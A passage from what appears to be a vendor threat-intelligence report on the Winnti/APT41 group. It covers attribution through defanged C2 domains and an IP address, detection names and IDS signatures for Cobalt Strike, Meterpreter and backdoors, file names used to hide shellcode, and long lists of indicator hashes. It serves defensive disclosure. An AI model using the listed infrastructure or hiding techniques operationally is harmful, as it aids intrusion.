Its configuration contains two C2 servers: update.upgradsource[.]com and ns.upgradsource[.]com. 
The domain upgradsource[.]com is mentioned in a Unit42 report on a group of similar samples named "Paranoid PlugX." They received this name due to the presence of a script for wiping traces of malware from the system.
Comparing the sample we found to those described in that report, we conclude with strong confidence that it belongs to the same group.
Among other reasons, the structure of the .NET Wrapper module in image.jpg, and much of the cleanup script a.bat, is nearly identical. 
According to Unit42, the main targets of Paranoid PlugX attacks were gaming companies—which are known to be a typical area of interest for Winnti.
Investigation of the network infrastructure provides yet another piece of confirmation of the relationship between Paranoid PlugX and Winnti. 
As of late 2017, update.upgradsource[.]com resolved to the IP address 121.170.185[.]183.
Later, update.byeserver[.]com and update.serverbye[.]com resolved to this address as well.
The second-level domains byeserver[.]com and serverbye[.]com, in turn, are listed by FireEye in its report on APT41. 8.
Conclusion Winnti has an extensive arsenal of malware, as can be seen from the group's attacks.
Winnti uses both widely available tools (Metasploit, Cobalt Strike, PlugX) and custom-developed ones, which are constantly increasing in number.
By May 2020, the group had started to use its new backdoor, FunnySwitch, which possess unusual message relay functionality. 
One distinguishing trait of the group's backdoors is support for multiple transport protocols for connecting to C2 servers, which complicates efforts to detect malicious traffic.
Malicious files of varying resemblance are used to install the payload, from primitive RAR and SFX-RAR files to reuse of malware from other groups and multistage threats with vulnerability exploits and non-trivial shellcode loaders.
But the payload may be one and the same in all these cases.
Most likely, the choice is dictated by the precision (or lack thereof) of an attack: unique infection chains and highly attractive bait are held back for targeted attacks. 
Winnti continues to pursue game developers and publishers in Russia and elsewhere.
Small studios tend to neglect information security, making them a tempting target.
Attacks on software developers are especially dangerous for the risk they pose to end users, as already happened in the well-known cases of CCleaner and ASUS.
By ensuring timely detection and investigation of breaches, companies can avoid becoming victims of such a scenario. 
9.
PT products detection names 9.1 PT Sandbox Trojan-Dropper.Win32.Higaisa.a Backdoor.Win32.CobaltStrike.a Trojan-Dropper.
Win32.Winnti.a Trojan-Dropper.Win32.Winnti.b Trojan-Dropper.
Win32.Shadowpad.a Backdoor.
Win32.Shadowpad.c Backdoor.
Win32.FunnySwitch.a REMOTE
[PTsecurity] Crosswalk sid: 10006001;10006002;10006003;10006004; 
SHELL [PTsecurity] Metasploit/Meterpreter sid: 10003751;10003753;10003754;10003755;10006172;10002588; 
REMOTE [PTsecurity] Cobalt Strike Beacon Observed sid: 10000748;10005757; 
REMOTE
[PTsecurity] Cobalt Strike (jquery profile) sid:10005754; REMOTE
[PTsecurity] FunnySwitch sid: 11004815;1004814;11004813;11004812; SPYWARE
[PTsecurity] ShadowPad sid: 10005851;10005852;10005854; 
[PTsecurity] PlugX sid: 10001390;10001391;10002946;10004422;10004426;10004472;10004473;10004515;10004532;10005968; 10.
Applications 10.1 Known names of files from which PL shellcode may be loaded C_99401.NLS DriverStatics.ax DrtmAuth005.bin DrtmAuth13.bin FINTCACHE.DAT SEService.dat Theme.re WspTst.xsl cbdhsvcs.bin chrome_proxy.dll config.ini localsvc.ax log.txt msdsm.tlb normnfa.nls normnfw.nls services.bin soundsvc.sys storesync.dat storesyncsvc.ini svchosl.bin svchost.bin wbemcomn64.sys wbemcomna.dat winness.exe.config winupdate.txt 10.2 IOCs File indicators LNK file attacks 1074654a3f3df73f6e0fd0ad81597c662b75c273c92dc75c5a6bea81f093ef81 9b638f77634f535e52527d43ad850133788bfb0c c657e04141252e39b9fa75489f6320f5 0deb252a5048c3371358618750813e947458c77e651c729b9d51363f3d16b583 f50b624ba6eb9d3947f22cf7f95a6f70b7c463d3 a140420e12b68c872fe687967ac5ddbe 8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996 5b8e644acc097f7123172d96a3a45bd398661064 93ffd591948223e806c248861735e006 c0a0266f6df7f1235aeb4aad554e505320560967248c9c5cce7409fc77b56bd5 d500cec0ce5358751f3371b69a4a9bc402df8af4 45278d4ad4e0f4a891ec99283df153c3 bcfff6c0d72a8041a37fe3cc5c0233ac4ef8c3b7c3c6bca70d2fcfaed4c5325e 1a33f41d054a2ed2d395b19852583daddd056bb4 177e37ec8d07d6954b2102760c74708a 35a1ff5b9ad3f46222861818e3bb8a2323e20605d15d4fe395e1d16f48189530 0a462e8e3b153e249507b1652d9f6180463e7027 17548fb49ef598901ab83b7c630fbe9a beaa2c8dcf9fbf70358a8cf71b2acee95146dba79ba37943a939a2145b83b32e acf5f997a16937072a2a72f1ba7704f9703ea27c e5809996b6126a5573623a9010eb4ee2 dca8fcb7879cf4718de0ee61a88425fca9dfa9883be187bae3534076f835a54d db6333f84538a21466e5ffe3c7102e0543cec167 d53daa634260ed28fc2e8610ecf15ad3 4733d1204b06dc95178e83834af61934a423534e1d4edd402b37e226f0f2727f dba010496a7be2e5de1f923ffdfc19bf345b650b 9776f04d9c254a0b67f4dc000369a17c dcd2531aa89a99f009a740eab43d2aa2b8c1ed7c8d7e755405039f3a235e23a6 281c1b196cd992906d8583e64011dc28d9c52e3c 4a4a223893c67b9d34392670002d58d7 d4df4b58ee241e276ea03235445c04d1a28e48ec8b6e2599a56f6c4b8af3269b 7b6b01e9f726ab0b5f94cd68687d4787008cd7f5 4dcd2e0287e0292a1ad71cbfdf99726e d064f675765f54ee80392fcfb5d136cd2407d06d0ea8cd7d8632d1a2b24c0439 8b8b1219581555f2d9747b289d57c3e0e274fd07 260eae2912475e51d82534b467e5746b 32705d3d9f7058e688b471e896dce505b3c6543218be28bbac85f6abbc09b791 289b5017f5ee8c915f755b1c7eefffbfb3d2d799 28bfed8776c0787e9da3a2004c12b09a c613487a5fc65b3b4ca855980e33dd327b3f37a61ce0809518ba98b454ebf68b 0f1f2431ecccb980f7d93b9af52139d0d508510f 997ab0b59d865c4bd63cc55b5e9c8b48 4e5e3762c850536aac6add3a5ac66f54cbd15c37bd8fc72d3ade9dd5e17f420b 21a5bcd916bc61585cfe1d5656240237e24157b9 07254dbd369ba10a1f28ae707ba72dcf 2d182910dade1237f1dd398d1e7af0d6eca3a74a6614089a3af671486420fb2b 0261490fb7f88cc3e9db6aa3fd185d03d7646864 f6886709564630fbb48121d0ccc7c0a6 Shellcode injectors Payload: Crosswalk 0046df35f66a3b076d9206412be2f1f7ea4641d96574e7b58578c0c0995d1feb b73fcfc423d1bdb4649440689ff4894639b3bd0e 9697d60b744a14b3003559d17cfc2f8f 325430384d642ab2a902fb0e268e85808b6cbf87506ccdc314e116e7d1b8239e 0f2a5bbe03c5b3422609b78ca90fb7f06bfd966b eee464e5ded3f4e37d49c8a91b1eb157 9e27f110fc824d8b85855538c3320e8ea436e82737d686fcecb512b6f872e172 4481c4b0cf2207099c7b5979a6e81a2923d6c698 254ace03b179c6565ac2616dd4d24f85 bec68bcaa80bb00274ef7066ddc8de1b289fb5f8b8e8573f3a961664f41da9d7 cc24843afd627ced74a1d713328078a23db81e54 914151fa49be06ab570bb0db77ce6960 3454d87b2ce0eab44c07774c7b56318710f9a63626d6d2aaf898922178bf2792 e6cd7a9f5b421b80b50e5809c35732c427c6b6d8 fbfeecea5a8c752c9bffdf6b9f7fcf50 1e29e07b404836c82cd9b75e44a3169195a335dc494ba27f744f6605666c26aa a1e0ce3c384945fdde841d91d069505879587217 d19c5c55733244f4a8d5a1af4e6c1250 3a9bbf4ee872904e729466aa50d570b43451b0945a41b5d9d114f8c24683c21e 5d1bada317d596f3dec5b86e4e42639b2f5f71ac 6d967f275beb3855980a80d60ef8023c faca607b43551044fda3c799ce7e9ce61004100544eeb196734972303f57f2ae 159a5ca55d7c62d0167740f8f5310e18e03a8fd3 4518f25c6307ef6d2ea5c0e66f2b16d1 86100e3efa14a6805a33b2ed24234ac73e094c84cf4282426192607fb8810961 604c5f42eeb015016b35ec1c9019812afc400f5b 7078450715c103056b01ad87787aaed6 Payload:
Metasploit 0ad8ee3fe6d45626b28c0051c4c4f83358a03096ad06fc7135621293e95c75ae e8fcd7ca491bffc4838bf9eb6a7aec3f7e4acdc2 a752d48a4433eb2dd56c8946a345ac9e 75d573d1e788590195012a1965cfcaa911c566aee88331b7718ddc638028c175 ca66a779a5b720e5f73e91561bd3434db691e13b 2867ca5c273fbb128504a4e455e862a4 8c962ddbb515e73ecfc5df9db35a54c8c9d15713a04425298f2d89308e2a47bf ce1cb0050662e541e72a24c6a969fa7b51084a60 2555677876b50a03e42420838c1997f1 fb23c7fc2e5e8ae33942734c453961da9ed4659368d19180a8f1ecb3b9b8e853 d03a5b322f3748c9019ca24dd1943507d591165e 9a026082cb80cdba1a68ae1d14f79b9d 012d8d787c6e7a5f3dbe1e9cce7c5da166537a819221e210ef4d108f1a0a24b3 d913285f75a3a1a4f2a6e0f66bfda8efc71fc669 d8ff9eb5582371745ffe1636a89f97ce 420dc77afe28003f14dfe6c09fbf8194ead8a6e8222b6ab126e7ee9bf4b63fd4 ebafff5ff0517ea5c2c783ab7d0cffded468bf4f c024b658471a27ec5201f96f65f0b89a a02258fcb3694893b900f10f0f9bb1d0d522ed098b1cc8eab59f2f70209b3a0b 9bdd1af6fc74a8a3c2ff0e3bf1378ff290cdb35e bb4155a5add9446b6354d46a78edc8d5 f54cf6d9a5d77a89c4a2d47b02736d746764319e02ad224019db8de78842334a 8413380c19f348ef08051b2d6d8b39598bb05f68 cdddd08982ca2dd76a63cbf603956f1a Self-contained PL shellcode loaders Payload: Crosswalk 5841a4302fcbd63f66fc2afd41f8671744454aaa7e1ed834e935bfdb007a9a83 3d0b40b2a6fc691f702237ba5682335e7e74e649 a8bb1d69fb8a9d323bbc5d78f0e62850 e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae 4db6e492a9ef89e116f4da19f97d69cb82e08661 2dc960eb4691a148ece5ee2b24932f03 e398290469966aff01a9e138d45c4655790d7a641950e675785d0a2ab93e7d28 1e494e1cf8df105d95d0e0bb4879223030c48a0c 42a5908ff9b65d3b1a1a9f52ca6f06a5 8add31b6a2828e0d0a5b3ac225f6063f2c67c56036ff3f5099a9ee446459012a 5c11f70345d984391d041b604adfe5bfb5134755 5e3ef894b490d1c931a5f70d44789316 a4b2a737badef32831cbf05bfaa65b5121ddb41463177f4ac0dbc354b3b451d4 8c549d16dc97072f16e4a3114fbd7d47f8bc9726 1bc1df4b946e83f26c878f01145545a4 2fdef9d8896705f468f66eb8c20e5892d161c1d98ab5962aa231326546e25056 7b465b1e0d7be4d84e06a115fd55b97207de768c 221db0f664ea781b4dff81e0a354c63d Payload:
Metasploit a7df8143a36638de40233b141919d767678b45bf5467e948a637eaafb2820550 be39c3022218ccb3abcfc6c906359b76571f4241 dc758b9ecca41f7f66808258efbfc6cf 283302c43466bdc6524a1e58a0ff9cc223ab8f540a1b0248d1fcffe81b87d5d6 b2bb31ea3b4abaf3f3edbff405e23f2ce442dfe0 3839d37a6a7a29a7af79f102e28b8bc2 b447a7bb633f682058d4b9df5caabbe8c794f087b80bf598d6741a255e925078 3c523a969cc4c273ae27fef32630701516b08873 63584677683b5fbf4f69053a8de9ecbe 01c8cc07a83ffd7ac9ee008685eb360c9934919e86847c50c8843807b9d9c196 37ec3d5be7b535a8a31001815ab275a489e302f5 d92db6b734b1db3874396506613a4962 21dd261e5fe46b86833cd69b299ae5ee5f24da3d4e87de509eddda4d2f63d591 11e86ee44e7c3592c97f7191746e170b62f724bb c8f1aff87d12e0e5c7082b8a565c4abb Payload:
Cobalt Strike BEACON ba03feb351825029426e84c2f74e314f27b56714a082759650a455dfb1a946eb 8890155c88c690faaf900d1e63998756809273d0 cbccba5f774642c80aacfed20d20435b 06210a1f9bc48128e050df0884f9759e4d202bd103aa78e6b6eb3cec1a58cdb5 a0128edc037a91ce127291edd9d950e7661dd764 64071aaa193ab18722553bf6f573547b 0d6a5183b903b1013367b9a319f21a7a3b7798d9565a0deee52951f62a708227 2d35c342d8fc6f5d018937491e246da2ab293d43 b8b43c4c4207b180ec8be82ff066172a 1bd0f0fbd7df99c41e057f6d6c7107812ef1370609ad215a92227ca79ce6df70 7dcb0d7300aa54ef77eb3347e6204b31d4b9c6db 4922247f9b83341987e0b4e80f5c153f 29233eab65960c2da4962e343a3adab768673012d074db35ebc2abe2142ee73c 1d3dc9bb7acfe8416ac5ab51f24b6648b91eb305 cb682ec885f353bcc51ac350bc015783 79fbb45d0041933dce16325b87b969db12b7a8dedc918929615104835badc80f b13d58f1d24cf5e10a7013f4aeac22e974c74315 407990337eac6582533df5c85528817a 8f0538a18c944e2a98f1415d5528a0dab4367cd8689f598ab2da266c36403252 483c49349d29e11e0d195864e372a210ce5ce856 7e8ebe133a530ea86f179c87fc8e51f7 025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596 e63646f0089ce3a224d68029eecff72ef0259609 f9fa912e498f20c440dde32fc8a66608 d30dd7d82059dc34e72c3131dd7ea87f427cabe7225bbf59aa69e01cd761a1fe 8be2fccba22fdca0e453855c7428e709186f3e0d c839ae523f04e7859498de1dee570867 81ab37ae3abce3feabdefde6a008dec322e0168ce4f0456ee737135025399400 98d6dffb7e51170a02546eeb07c80f2592d10293 5ed49962d13dcd6e0eab98f966273fca b55812f35735e4fb601575072f1b314508b2dafdcb65aa6c1245a2e1f9d80bdd 6986b924c58aa90a9e413d9942c25a1419d9aa0e f88416bc9ffcb639f1357ebafe3ae9a7 fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc 0902e3c41fb8e0dffc322e6a562f04588b7522a3 6817b7a5d1542eff1cc404a44a31353a d879b6cac6026a5418df4bf15296890507dbaec5abe56dafda54266975488cf2 11c987cdafec8ea02a77a03d4c979f743138b39a b02057f05f57f3a889a744533001cf7d 6e7052562db5f23c2740e9d094aae2316f77866b366eb4ef59c157e112172206 7fd0d64f54a54aabd04136e4111e2d8a22884324 dda83ca52a9d9dbdc7752db8ed9533a9 9afb78e9be08041f849563c4fd2777a373ffc76c3eccd638b1f6f846b847b968 2b47e9c8946536decba6066f9a57a85f143465c5 482d1c1e2044b0b4d1641f15d82e86b6 8b515bf88b3f7ac77861fdea61f82fb0c941bc5569922cadca254a79a744ae99 e46490394ddc66548067ba540d13fb3cf363c596 2a189598113d436e4b717abb76f1c652 f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c 0b83939510bd31939c91370c53fab25aa286ba08 5909983db4d9023e4098e56361c96a6f 3d38dfd588fc98de099201fe9f52feb29bb401fc623d6fe03eb8f0c959ffc731 af76d1d293e3e8fe7ad428ca6fe47e68c858587b 284dcb880e68d66cb890ef85d78ea7ae 6a10027dd99f124cd9d2682b6e7b0841d070607ea22a446f3c40c0b9f9725bed f2751dbfe822907ecb69b83e461b48183a485355 0d69dae8f83f09b8671b8552a0acd319 71a965d54c4b60f7ae4a5e46394bfca013d06e888ec64f06d5ec3d8a21eccb55 4b51a8233991d4255fc05d9bbfc242f779b1d31d 5e61778a1e660691dce99ebb8e5e257c 5347c5bbfaec8877c3b909ff80cda82f505c3ef6384a9ecf040c821fc7829736 1530993376416274d04907ff6369a3012694bfa9 62d6fb0f33d0411ea6abd3167118a0e1 de648c21b4fae290855fdf0cd63d9e6807ced0577bdcf5ff50147ba44bf30251 3a0c2aee518b7c003e5eb8aa7094d536b8bf1a94 dbd6a052331365a31f74e2c41d5cd132 7ed5cbeb6c732aa492762381033ff06d0c29f1c731530d4d27704822141a074a 2d0bb1fc0213e4fca5c3b485caaf964dd2da7981 05e1247ff02d50aed81ecd9d0b93c41c e886caba3fea000a7de8948c4de0f9b5857f0baef6cf905a2c53641dbbc0277c 6b92e6d594fd6e26f9e910f10f388c43017303b2 48bda0c5e53b6d7ee7fb1da6130f325f External PL shellcode loaders 0041b28d1f076e196af761a536aa800ebe2fcaea9084a8e17d2a43c43765efdd 0cb8ed29268ec9848ff1c7f25f28b620271e61c9 131711477620098191777f93c580ee6c 0756216ea3fea5b394e2fa86e90a75f05c3da2b4b47d61110559bd28f51da8e6 7a1c5e1799bdeebb01527f54a7fd89d0b720dea7 53e2c1eb6b87e92b5f534503f011f6ee 34aeaa89aab983318ed8f6da32556faf3057a92dc045fac1f960f3aaad3a1ba1 a42e6dc7f248794e91e4ec251c2c96164215b7be f02a87562ffdd7a1c941dac4175854b0 40101054d18eb50b65c2ce32b00352d2486008f67c63baec5ef93cac9d5c81ed 11d7145b85fea84aed35c60857560a66dbff5a27 e5271b41cf32892cc16445ac0783f3f7 4665280d4b34c5388edeb51a6d5e808d2942c364017a42d3f1fac186b21eb571 09a3fb96edbd5e143ba3b579cb2c09d0dd9469eb da220930ac3e45a713d9da2e6c1c246a 46f03ddf74c47960a3731de18f123b2110153ed668f9bf6ed3badd7fd099ccb6 90c104dadb5c21b4fca644b37f7043fef7e72d2b 71b250a873a070415fed172759a42b7d 4f2d8c437d32dc075074f01d10698f6d4dfc4d4bd8a595dabaa2519c6a025c8e e629fda195636d99ac587b354b5c6fc228d65d81 8b2e72f2b13c63a583ae9a9cd474adf6 655c21fc31967282d8517b3c845f775cd0a80595f90c5c85b6027110532a1cf9 5fa5593b52cfc866c51f55e9a56b1adcc9db01d1 318b3661ec5929f069e7821fac537fe0 8f8ee8d2bc6c559a0a09ce3958727dee2f30880c615b2788d757917ca55d43ef b769c9c708f59be0a0d68ddf3076c9d9037b6c27 1d6def7a4bed4a8772e3cae6926d405b 8fb8134bf40ad6bddd60ea77b78c30dab72c736bf29172f89d03505b80c3ae8d 9a17591711383d96f7cc421a71d5d394e322189a 7af8c2055a608c920ba5e5c63fd43207 9bf32bf4a4bc1d13bddaa6402595ad76d2d9fcc91a988313f13ed990ccb1c4c1 68ae7f3d2cb22c70232a35ed59f6fed70fe0f3be fb2ac5049bdee8dd1753fa7e9d007e6b 9c3280bc1ebc239de86523a7046b45e9bb7ce7a40a869dda6ea92fcee727366a cf90d0b4ac09dc97f675fb3cfbc8eba89db211e8 bb6b9a60c3b4062669bac3608ca7b0c1 bfe2673b02c54be9093cff8fd564b630109175c608f07d94e4a2ac65028a6eae 59c4f47b1135f21a8814c8a838277f4cfa46f2e5 fcceb7a3bc3b0c48c8d9c91eb0b896ab c93999f7622caf63cbcfb26966ff11719a4e26bca7d90a843461f44a3c982a30 0a8fbc71a936d2e7f2830fae3d57a2f1e8e43266 36fe1e0db5e74ed3e6adc039720c54d6 d0686f44fb7e77ce0f68cc91c4cef12dbd691bb99b0b7be77103b7b17eec3753 0b09ac7691cb9b8b7b5a2e453984bc75edbc8aeb b5605f71d18cc255dbbd910ac008ae6e d6a05e20da5012c0cfc491b0044f7fded9322f5bbc664092c4b481709c3472e0 735e97688a70d24d922cf9a3951c5e23a91cbcb1 4a89eb933fa87d85542488df6ae20d82 e7f5a30d4bf7915cc97374e0f6a29573d4640961166b5c9b942030e8c10949d8 c224763846f8f61442e893cb8e9070ce67be5dc8 63c1b74c829ee362730ff37d6101d276 e935699b31707ecf9e006940f31f09514688cb45e078a66724603ee7fadf84db 5ba9f7cd51e8eac88f870e340c8262683d92563d 99b86e64d76d21b2a5bfeb48b89e3935 f36a0b99973a837d5e4d542edd739df7cac10e207be538d47a106c4edf7cff54 fde9357e8d6a3336dbd82d2e22dbc0772640f63f 0133bd3f26788732a580115218d98273 f69c6e8fe1188a461bfe249ba7afefbd7a787fcd0777c008f9580f6976118898 d3d4c7cf257f9fe97bdf31a4b0e3f66726fb1b6f 3d09dee9bc20abf33b64bcb4c6d3130f fad80dc36a59d1cc67f3c4f5deb2650ca7f5abac43858bf38b46f60d6bb4b196 119b92462a91f9cc8b24dfbd84fb88ef47ecab97 247c48b8758a9eba48bfe39c53ff9e6e 0187d3fae2dfc1629e766d5df38bdabf5effcb4746befceb1aaf283e9fe063a1 648594c25aebf3865c35ce6057e36b42e9e3be31 dbc30db0ed5ba1ea3b2e500823448c6c 45d175f3c1cb6067f60ea90661524124102f872830a78968f46187d6bc28f70d 418fab494383e2ae0d94900344853cc0bc6d5385 337171764c99b7ae87c030e11cda00c6 ca0f235b67506ed5882fe4b520fd007f59c0970a115a61105a560b502745ac6a 1c265ed6b5875a619a427db1663f48fe7db01d88 2a3e63fdbcbbad9b4be8b35a180ea0d4 abac7a72b425ff38f8a7d8b66178da519525dc2137ca8904b42301fb46a8983e d9b692d84bdc134f90b54ac2a30f6832d70e730b 211db7515faa09aa0623b327bd1530f1 645b14df1bd5e294ec194784bc2bd13e0b65dac33897c9b63ad9ed35ec6df3a8 6d3643bfdd1bd85cfdfe4b05eaf2939bbf4b22f0 359f5615dcf2f75bc74146afad630427 6b4b9cf828f419298cd7fda95db28c53fc53627124224d87d2ad060185767957 59208d32dd7440bbe4142882b8ad1ac033f08918 bae0fc6f570ca12a9b2980dd00bc673c 7fd19347519ec15ab8dbce66722b28a917b87ad034282ef90851e1b994463644 c4467556640ad45fb8e56d1fb95c93e57b209924 086186c935a68e7167113da46a17fa80 8308e54055b45eb63dc6c4c6a4112310a45dec041c1be7deb55bec548617136f c44934f47c98c7cde7ba5978ca315a5e9099d0c8 cf13bdefb622fc90dcda39e20e45d636 adf52650ce698e17d5ff130bc975a82b47c6c175ad929083d757ec0fe7c4b205 bed84d4ef7bd8c5fb683eab51d849c891328b4d4 08393f7d6e0ee2b7472173f4419a602d fb707094673a48408f9ba5240019cb502b9367fb380bb1734e0243e90b9399c3 e452227d134fe14df3ca35cd2abf7f1e922aa5d6 d761c07911138e605723f891965035b8 4da733bbf7d585ee5b5a58c0ad77047ce640a4512a84502ad5ae9240ee2fcdb0 ff362a3d5d873f8fd0f7c2f150582dab9251cf2c 5eab890242e8b811865e1bd3a7fd7868 bef3f87c6582813e23b0c8c8db9ca9ed65bc802445187378f4e62a7246133ae2 27e4115041c059dce22322e0242002353ab14814 6d33db967323d822ba3239dcdfcb555c b83534071bbcacc175449faadbb1d6b0852fe58521da0fefd5398a4a9b1fb884 26ca2262f31dcc1fd6ad56f1f371a363163ba7f2 d12013fb90a60869cfdaaffe1a18467d adf52650ce698e17d5ff130bc975a82b47c6c175ad929083d757ec0fe7c4b205 bed84d4ef7bd8c5fb683eab51d849c891328b4d4 08393f7d6e0ee2b7472173f4419a602d e4df8634f5f231fae264684e63b3e0c6497b98dd24ba1b0c6f85c156d33a079c e3e7b719fa1bb3fd12bb82592f85c3e4c3b1d7fa 03275b5b1f9d11b1731d5746827d00b1 afb5e3f05d2eedf6e0e7447a34ce6fd135a72dad11660cf21bec4178d0edc15b c67ad0bb292ed20dbe9ba980e71d223249632252 38857fb40e0655495df270777043b813 1968f29b67920fc59e54eba7852a32f20ecbf3f09481c09ddbee1dedc37f296e b49679280a2c5b01d0126fc835cc29e4fdc5900d 468c5c3f46299c67366727a58e3322e4 be70b599e8d7272e8debf49e6bf6e5d8d9f1965812f387a9f1e75aa34788a7c7 88282f8c93d61fd0caaec8807448e96f90101901 db394163c7e6e511d0e4046ff34d67e2 PL shellcode: Metasploit f6085075e906a93a9696d9911577d16e2b5a92bc6b7c514d62992c14d5999205 4a0b8e9a56876c11c667b9ce77b371d2c6d07891 8849cf257c383044c006beb8e66d3add PL shellcode: Cobalt Strike Beacon 43fe07f9adeb32b20e21048e9bb41d01e6b3559d98088ac8cd8ab0fad766b885 30dee2118fc28bb0b2804275c92daf58236824e5 2a2a50ec29f741faecbff0bcf705da0a 6867f3d853de5dfe8adbd761576c29ad853611d8d1c7fdd15b07125fd05321f8 7420afe3c0c91442fac0c6df5dd1cfedd76503de 69b9d1fc0edb0a67909847e43ac79ccf 0c6c6ba92661c119168a5486faa1af94673bd4d770c13c2b49d7a0651f798857 cb552c22718ca9eaf16792c1ecc583c09f1f19e1 b67ff211420c9f5647df2de02e771864 be7ba33fcb2a19bb2d1fe746f49c39fb1b8bd5d9e46d5b6610f8a2ad3f60b248 7849dcf58fbb930a1327635e13e9970d4bdc7121 9a478e85f1aed628e3fc1f7c8fdeae82 d1a548b9ad6b4468ee3c5f6e1aaaa515021255fb13e45ff34fbff5ad88bf4de2 93404b4005e7ab0e8c9282ced20c16820378792b eff6e2a93e60fe017e9f082cd6d3fac9 9ad808caa0b6a60a584566f3c172280617e36699326e7425356795b221af41dc f3093ae9f6633449c1d4f35804d1166dcbe09ece abb6e606a5fd22abfaefb1dbf970ce2f eb9c850b1e8d8842eb900fa78135b518fb69da49c72304b5b3b4b6f4fa639e57 6c34f4f29cb3d8cc8f55a707d255de50caa67e8f b80d303171db4adb554e656aaba15fc9 e10046b86fe821d8208cb0a6824080ea6cd47a92d4f6e22ce7f5c4c0d9605e4b 1cc16e3a6185b790875e3f00b68ec87feddcf93f cd43240098f60c5d65290ef93ebdf6de a783edae435c6fdf55e937b3246b454ed3b85583184b6ffc1b2faba75c9165cf aed326228551a4736012c1921d3be7079541c29e 07377cf8abcabcf4ec87e9dde67672d6 CHM file attack b6685eb069bdfeec54c9ac349b6f26fb8ecf7a27f8dfd8fcdb09983c94aed869 db190af369fdc654af39a54c44f37d5e5712fda8 06f945c39870743d51ca887efb32d649 5d549155b1a5a9c49497cf34ca0d6d4ca19c06c9996464386fc0ed696bf355a2 7dabbd292f8bb8b600439a9c1b2fa69eeecbcb88 46d3773e0e306b8a1ede7932b83fb034 02f5cb58a57d807c365edf8df5635263f428b099a38dff7fe7f4436b84efbe71 9c921a278ba4647269b45a5716b47ee47b6de24f e8c21f8f50bc5720b1713322db4a9022 3c8049bd7d2c285acc0685d55b73e4339d4d0a755acffad697d5a6806d95bb28 201eac040aa2693042efa7539a88e2676dcf89af e93bdab9e64bcce94f70a91e0ee115da fcbd7ab82939b7e0aff38f48a1797ac2efdb3c01c326a2dcf828a500015e0e83 8a503147831499778b2d50f8337677c249c99846 21aa8aa3a92ebca1963595a328061843 3c6d304c050607a9b945b9c7e80805fc5d54ced16f3d27aaa42fce6434c92472 1e75cfd3db2cc4b0091e271a7533b828632f399c 951c5f08eef4ef8acc3352a44c7c0e80 4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6 9c1d4db37c2d72ac9761dd342feb8a31bc636d6d b22b232381ea465aeb81fb7077141d06 FunnySwitch 23dfce597a6afef4a1fffd0e7cf89eba31f964f3eabcec1545317efeb25082ed 6dd15c03ffd3762a20b0f51faf31724d5dbf1466 2b0c692d9eafed5e24f2b52234ea0fa2 2063fae36db936de23eb728bcf3f8a5572f83645786c2a0a5529c71d8447a9af c1e31f72adba9d5e2801e6766a24eb8d37807e9d 7e1948326ff96a1b6f8e8d6dee152e28 fbc56623dd4cdfdc917a9bb0fbe00fa213c656069c7094fe90ba2c355f580670 69b961af528eac458942dc1787f32dc432a328d9 2902f54dbd1f143784dfcb170dfc170d fb0fdd18922977263f78becdedddab7a03c8de16a5431c7b4602e5be13110fa3 6e3d0537cd52965e52b06b984155191c41fe0a18 30684061b51971698984b531205429ca b45baac2ae9c5fdfbf56131451962826a95d56f641af8ca1b74738c2eb939a76 4f0402e2638831d6259a366cf605eadb8c7fd478 5fcf6562217dd1bb21003a9613739aff ff0527ea2f8545c86b8dfdef624362ed9e6c09d3f8589f873b1e08a895ef9635 ed8cc92b5a04620b01fcc4365e8f2ffe0c49eb30 f5b3106f2ff44bf860d077e77a1992e3 931ea6a2fc0d5b4c5c3cf2cba596a97eaa805981414c9cda4b26c8c47bf914df ebb08480d3d94d6d3a8d85894d297db996d57b4f b6953b1d1c78770a6d4b3e0c9d146d9b 568298593d406bd49de42688365fdc16f4a5841198583527a35f6a7d518a6b0e 425e6c8e89f45a8fe57a27d1eacdc850b2286099 bbeca57f7993a34e6296c8dedb996b76 ShadowPad 03b7b511716c074e9f6ef37318638337fd7449897be999505d4a3219572829b4 147529e1a8b00a62fa2371600988b17487260448 a26d2c6f7df4b74b56f9376a2d234661 5a151aa75fbfc144cb48595a86e7b0ae0ad18d2630192773ff688ae1f42989b7 ea43dbef69af12404549bc45fda756bfefcb3d88 493698b1d7acfbf57848b964b4b0ae97 3b70be53fd7421d77f14041046f7484862e63a33ec4b82590d032804b1565d0d ebcb044373550b787553a9b9cd297f4b8c330cd3 652c44a6b5d09bf4c749a4b4d1bae895 ae000f5cef11468dde774696423ca0186b46e55781a4232f22760a0bfbfb04f0 ee4744c4e74aa9933f3a5c340d9b739f8399b7f2 4001d217c9a77d5839fbc033937f7ed4 5f1a21940be9f78a5782879ad54600bd67bfcd4d32085db7a3e8a88292db26cc f6f6f352fa58d587c644953e4fd1552278827e14 52c28bdb6b1fc4d77b1ea58dc8c1c810 e93a9e59ee2c1a18cee75eedcbe968ed552d5c62ec6546c8a1c1f1ae2019844e 1a654b4191a3196353801d37a1de21535eb7a41c eb763c30f69c4f438be7545e2a1ca76c 1f64194a4e4babe3f176666ffd8ee0d76d856825c19bfcd783aec1bacb74fd05 801b756019c075ef6a20c8219157fe8f92deebc1 791f92ce878c8327337eb8e35675a715 531e54c055838f281d19fed674dbc339c13e21c71b6641c23d8333f6277f28c0 6966687463365f08cfb25fd2c47c6e9a27af22b0 
